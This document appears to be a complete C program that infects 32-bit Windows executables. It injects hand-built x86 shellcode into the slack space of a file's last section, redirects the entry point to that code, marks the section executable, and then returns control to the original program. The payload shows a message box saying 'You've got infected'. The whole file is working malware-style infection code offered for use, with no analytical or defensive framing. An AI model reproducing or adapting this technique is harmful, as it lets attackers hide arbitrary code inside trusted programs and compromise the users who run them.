#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define PAYLOAD_SIZE 84 // 58 bytes shellcode + 6 bytes "Alert\0" + 20 bytes "You've got infected\0"

int main(int argc, char* argv[])
{
    if(argc != 2)
    {
        printf("Usage: %s <target.exe>\n", argv[0]);
        return 1;
    }

    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening file %s\n", argv[1]);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if(fileSize == INVALID_FILE_SIZE)
    {
        printf("Error getting file size.\n");
        CloseHandle(hFile);
        return 1;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, fileSize, NULL);
    if(!hMapping)
    {
        printf("Error creating file mapping.\n");
        CloseHandle(hFile);
        return 1;
    }

    LPVOID pFile = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if(!pFile)
    {
        printf("Error mapping view of file.\n");
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFile;
    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("Invalid DOS header.\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32)((BYTE*)pFile + pDosHeader->e_lfanew);
    if(pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("Invalid NT header.\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    WORD nSections = pNtHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    PIMAGE_SECTION_HEADER pLastSection = &pSectionHeader[nSections - 1];

    DWORD slackSpace = pLastSection->SizeOfRawData - pLastSection->Misc.VirtualSize;
    if(slackSpace < PAYLOAD_SIZE)
    {
        printf("Not enough slack space in last section.\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    DWORD injectionOffset = pLastSection->PointerToRawData + pLastSection->Misc.VirtualSize;
    DWORD injectionRVA    = pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize;

    uint32_t imageBase = pNtHeaders->OptionalHeader.ImageBase;
    uint32_t originalEntryAddr = imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if(!hUser32)
    {
        printf("Error loading user32.dll\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if(!pMessageBoxA)
    {
        printf("Error resolving MessageBoxA.\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    BYTE payload[PAYLOAD_SIZE] = {0};
    int offset = 0;

    payload[offset++] = 0x60;                            // pushad
    payload[offset++] = 0x31; payload[offset++] = 0xC0;  // xor eax, eax
    payload[offset++] = 0x50;                            // push eax (MB_OK)

    uint32_t addr_caption = imageBase + injectionRVA + 58;
    payload[offset++] = 0x68;
    memcpy(payload + offset, &addr_caption, sizeof(uint32_t)); offset += 4;

    uint32_t addr_text = imageBase + injectionRVA + 64;
    payload[offset++] = 0x68;
    memcpy(payload + offset, &addr_text, sizeof(uint32_t)); offset += 4;

    payload[offset++] = 0x50; // push eax (NULL hWnd)

    payload[offset++] = 0xB8;
    uint32_t msgBoxAddr = (uint32_t)(uintptr_t)pMessageBoxA;
    memcpy(payload + offset, &msgBoxAddr, sizeof(uint32_t)); offset += 4;

    payload[offset++] = 0xFF; payload[offset++] = 0xD0; // call eax
    payload[offset++] = 0x61; // popad

    payload[offset++] = 0xB8;
    memcpy(payload + offset, &originalEntryAddr, sizeof(uint32_t)); offset += 4;
    payload[offset++] = 0xFF; payload[offset++] = 0xE0; // jmp eax

    const char* captionStr = "Alert";
    memcpy(payload + offset, captionStr, strlen(captionStr) + 1);
    offset += (int)(strlen(captionStr) + 1);

    const char* textStr = "You've got infected";
    memcpy(payload + offset, textStr, strlen(textStr) + 1);
    offset += (int)(strlen(textStr) + 1);

    if (offset != PAYLOAD_SIZE)
    {
        printf("Payload size mismatch! Expected %d bytes, got %d\n", PAYLOAD_SIZE, offset);
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    memcpy((BYTE*)pFile + injectionOffset, payload, PAYLOAD_SIZE);
    pLastSection->Misc.VirtualSize += PAYLOAD_SIZE;
    DWORD newImageSize = pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize;
    if(newImageSize > pNtHeaders->OptionalHeader.SizeOfImage)
        pNtHeaders->OptionalHeader.SizeOfImage = newImageSize;

    pNtHeaders->OptionalHeader.AddressOfEntryPoint = injectionRVA;
    pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;

    UnmapViewOfFile(pFile);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    printf("Injection successful! Payload injected at offset 0x%X (RVA 0x%X)\n", injectionOffset, injectionRVA);
    return 0;
}